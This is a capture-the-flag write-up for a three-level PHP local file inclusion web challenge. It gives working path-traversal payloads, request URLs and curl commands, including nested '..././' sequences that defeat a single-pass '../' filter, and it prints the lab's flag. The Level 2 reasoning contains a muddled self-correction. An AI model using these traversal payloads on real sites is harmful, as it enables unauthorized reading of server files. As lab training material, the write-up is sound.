# [Medium] Web - Local Matters of Inclusion - Solve Guide

## Overview
The application passes a user-controlled filename directly into a PHP file inclusion or `readfile()`-style function via the `img` GET parameter. Across three levels, progressively stricter input filters are applied to the parameter — each requiring a different traversal technique to break out of the intended directory and read `/tmp/flag.txt`.

## Initial Analysis
Browsing the application reveals that images are served via:

```
http://localhost:8000/images.php?img=/var/www/html/404hoodie.png
```

The full absolute path to a web asset is passed in plaintext, with no tokenisation or indirection. This strongly suggests the server is passing the parameter value directly to a file read function (e.g. `readfile()`, `include()`, or `file_get_contents()`) without sufficient sanitisation — a classic Local File Inclusion (LFI) vulnerability.

The target file on all three levels is `/tmp/flag.txt`.

## Enumeration / Inspection
- The `img` parameter accepts absolute paths
- The web root is `/var/www/html/`
- Level 2 enforces a path prefix check — the value must begin with `/var/www/html/`
- Level 3 additionally strips occurrences of `../` from the input, but does so **non-recursively** (a single pass), making it bypassable with nested traversal sequences

## Method
- **Vulnerability:** Local File Inclusion (LFI) via unsanitised file path parameter
- **Technique (L1):** Direct absolute path traversal
- **Technique (L2):** Path prefix bypass using directory traversal (`../`) to escape the enforced base path
- **Technique (L3):** Filter evasion using nested traversal sequences that collapse into `../` after the non-recursive strip is applied

---

## Exploitation / Decryption / Solution Steps

### Level 1 — No Filters

The parameter is passed to the file read function with no validation whatsoever. Supply the target path directly.

**Payload:**
```
/tmp/flag.txt
```

**Request:**
```
https://lmi1.pwn2play.com/images.php?img=/tmp/flag.txt
```

The server reads and returns the contents of `/tmp/flag.txt`.

---

### Level 2 — Path Prefix Restriction

The server checks that the `img` value begins with `/var/www/html/`. The path must satisfy this prefix, but no further validation prevents directory traversal sequences after it.

Start the payload with the required prefix, then use `../` three times to climb back to the filesystem root, and continue to the target.

**Traversal logic:**
```
/var/www/html/  →  start (satisfies prefix check)
../             →  /var/www/html
../             →  /var/www
../             →  /var
                   (three more to reach /)
```

Wait — from `/var/www/html`, three `../` sequences reach `/`:
```
/var/www/html/../../../  =  /
```

**Payload:**
```
/var/www/html/../../../tmp/flag.txt
```

**Request:**
```
https://lmi2.pwn2play.com/images.php?img=/var/www/html/../../../tmp/flag.txt
```

---

### Level 3 — Non-Recursive `../` Strip + Path Prefix Restriction

The server applies the same prefix restriction as Level 2, and additionally strips all occurrences of `../` from the input. However, the strip is performed **once** (non-recursively), meaning a sequence that contains `../` embedded within itself will collapse into a valid traversal after the strip pass runs.

**Bypass principle:**

The string `..././` contains `../` at characters 2–4. After stripping that match, the remaining characters are `..` + `/` = `../`. Similarly, `....//` strips the inner `../` to leave `../`.

Crafted sequences that produce `../` after one strip pass:

| Obfuscated input | After stripping `../` | Result |
|---|---|---|
| `..././` | strip `../` → `../` | ✅ |
| `....//` | strip `../` → `../` | ✅ |

Build the full payload using these sequences in place of each `../`:

**Payload (using `..././`):**
```
/var/www/html/..././../....//..././tmp/flag.txt
```

**Step-by-step strip resolution:**

```
Input:    /var/www/html/..././../....//..././tmp/flag.txt
Strip ../: /var/www/html/../../../tmp/flag.txt
Resolved: /tmp/flag.txt  ✅
```

**Request:**
```
https://lmi3.pwn2play.com/images.php?img=/var/www/html/..././../....//..././tmp/flag.txt
```

---

**Flag (all levels):** `P2P{253c66b40f33079aadf7ba541b048a566fbf3bd4}`

---

## Commands Used

```bash
# Level 1 — Direct path
curl "https://lmi1.pwn2play.com/images.php?img=/tmp/flag.txt"

# Level 2 — Prefix bypass with directory traversal
curl "https://lmi2.pwn2play.com/images.php?img=/var/www/html/../../../tmp/flag.txt"

# Level 3 — Non-recursive strip bypass
curl "https://lmi3.pwn2play.com/images.php?img=/var/www/html/..././../....//..././tmp/flag.txt"
```

## Scripts Used
None — all three levels are solvable with standard `curl`.
